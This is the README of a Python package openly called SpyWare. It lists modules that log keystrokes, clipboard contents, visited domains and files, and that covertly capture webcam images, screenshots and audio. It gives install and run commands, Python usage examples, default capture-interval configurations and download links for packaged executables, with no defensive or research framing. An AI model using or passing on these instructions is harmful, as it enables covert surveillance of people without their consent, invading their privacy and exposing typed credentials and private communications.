# SpyWare

## Description
This package implement a spyware.

You have:
 - KeyLogger
 - ClipboardLogger
 - Domains/IP logger
 - Webcam spy
 - Screen spy
 - Files logger
 - Recorder

## Requirements
This package require :
 - python3
 - python3 Standard Library
 - pyautogui
 - opencv-python
 - pillow
 - pyperclip
 - pynput
 - pyaudio

## Installation
```bash
pip install SpyWare
```

## Launcher

## Command line:
```bash
SpyWare # Run all modules
SpyWare screen # Run module screenshot
SpyWare key keylogger.conf # Run module key with custom config file
```

### Python script
```python
from SpyWare import spyware
spyware() # Run all modules
```

```python
from SpyWare import AudioLogger
AudioLogger.audioSpy() # Run a module
```

There are three way to change the config filename:
 1. With argument `filename` of config function
 2. With `environ` variables
 3. With command line arguments

```python
from SpyWare.FilesLogger import Daemon, filesConfig
filesConfig("files.conf")
Daemon().run_for_ever()
```

```python
from SpyWare.CopyLogger import Daemon, copyConfig

from os import environ
environ["clipboardSpy.conf"] = "clipboard.conf"

copyConfig()

daemon = Daemon()
daemon.run_for_ever()
```

```python
from SpyWare.ScreenLogger import Daemon, screenConfig

from sys import argv
argv[1] = "screen.conf"

screenConfig()

daemon = Daemon()
daemon.run_for_ever()
```

To change the config file with `os.environ` you can use the default filename.
Defaults filenames are `PYTHON-DIR/Lib/site-packages/SpyWare/<Module>/*.conf`.

### Python executable:
```bash
python3 WebcamLogger.pyz webcamSpy.conf

# OR
chmod u+x WebcamLogger.pyz # add execute rights
./WebcamLogger.pyz webcamSpy.conf # execute file

python3 SpyWare.pyz screen screenSpy.conf # run one module

chmod u+x SpyWare.pyz
./SpyWare.pyz screen screenSpy.conf # run one module
```

You can't use python executable file without custom configuration file.

```
python3 WebcamLogger.pyz
Traceback (most recent call last):
 ...
KeyError: ...
```

So you can't run all module with one command line and python executable:

```
python3 SpyWare.pyz
Traceback (most recent call last):
 ...
KeyError: ...
```

### Python module (command line):

```bash
python3 -m SpyWare # run all
python3 -m SpyWare.AudioLogger # run one module
python3 -m SpyWare.AudioLogger audioSpy.conf # run one module with configuration file
python3 -m SpyWare.AudioLogger.AudioLogger # this command run one module too
```

## Default configurations files

### Clipboard
 ```ini
 [SAVE]
 filename = clipboard.txt

 [TIME]
 clipboardSleep = 11
 ```

### Recorder
 ```ini
 [SAVE]
 filename = record*.wav
 dirname = records

 [TIME]
 recordSleep = 3590
 recordTime = 10
 ```

### Domains
 ```ini
 [SAVE]
 filename = domains.txt

 [TIME]
 dnsSleep = 60
 browserSleep = 86400
 readingFileSleep = 0.5
 getDomainSleep = 0.05
 ```

### Fileslogger
 ```ini
 [SAVE]
 filename = files.csv

 [TIME]
 fileSleep = 0
 directorySleep = 1
 relaunchSleep = 86400
 ```

### Keylogger
 ```ini
 [SAVE]
 filename = keySpy.txt
 event_press = 0
 event_release = 0
 hot_keys = 1
 event_time = 1

 [TIME]
 ```

### Screenshot
 ```ini
 [SAVE]
 filename = screenshot*.png
 dirname = screenshots

 [TIME]
 screenshotSleep = 3600
 ```

### Webcam
 ```ini
 [SAVE]
 filename = webcam*.png
 dirname = pictures

 [TIME]
 pictureSleep = 3600
 ```

## Links
 - [Github Page](https://github.com/mauricelambert/SpyWare)
 - [Documentation](https://mauricelambert.github.io/info/python/security/SpyWare.html)
 - [Documentation Keylogger](https://mauricelambert.github.io/info/python/security/SpyWare/KeyLogger.html)
 - [Documentation Recorder](https://mauricelambert.github.io/info/python/security/SpyWare/AudioLogger.html)
 - [Documentation Clipboard](https://mauricelambert.github.io/info/python/security/SpyWare/CopyLogger.html)
 - [Documentation Webcam](https://mauricelambert.github.io/info/python/security/SpyWare/WebcamLogger.html)
 - [Documentation Screenshot](https://mauricelambert.github.io/info/python/security/SpyWare/ScreenLogger.html)
 - [Documentation Files](https://mauricelambert.github.io/info/python/security/SpyWare/FilesLogger.html)
 - [Documentation Domains](https://mauricelambert.github.io/info/python/security/SpyWare/DomainsLogger.html)
 - [Download as python executable](https://mauricelambert.github.io/info/python/security/SpyWare.pyz)
 - [Download Keylogger as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/Keylogger.pyz)
 - [Download Recorder as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/AudioLogger.pyz)
 - [Download Clipboard as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/CopyLogger.pyz)
 - [Download Webcam as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/WebcamLogger.pyz)
 - [Download Screenshot as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/ScreenLogger.pyz)
 - [Download Files as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/FilesLogger.pyz)
 - [Download Domains as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/DomainsLogger.pyz)
 - [Pypi package](https://pypi.org/project/SpyWare/)

## Licence
Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
